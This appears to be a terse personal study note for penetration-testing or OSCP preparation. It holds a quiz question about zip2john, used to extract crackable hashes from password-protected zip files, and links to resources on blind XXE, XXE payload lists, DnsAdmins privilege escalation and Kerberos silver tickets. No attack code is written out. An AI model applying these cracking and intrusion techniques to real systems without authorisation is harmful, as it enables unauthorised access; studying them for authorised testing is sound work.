GQ: What is `zip2john` exactly?  _"What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?"_



https://portswigger.net/web-security/xxe/blind
https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
https://github.com/payloadbox/xxe-injection-payload-list



# RESROUCES

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise

https://github.com/xnl-h4ck3r/GAP-Burp-Extension


OSCP ??? https://github.com/lutzenfried/Methodology/blob/main/01-%20Internal.md#silver-ticket
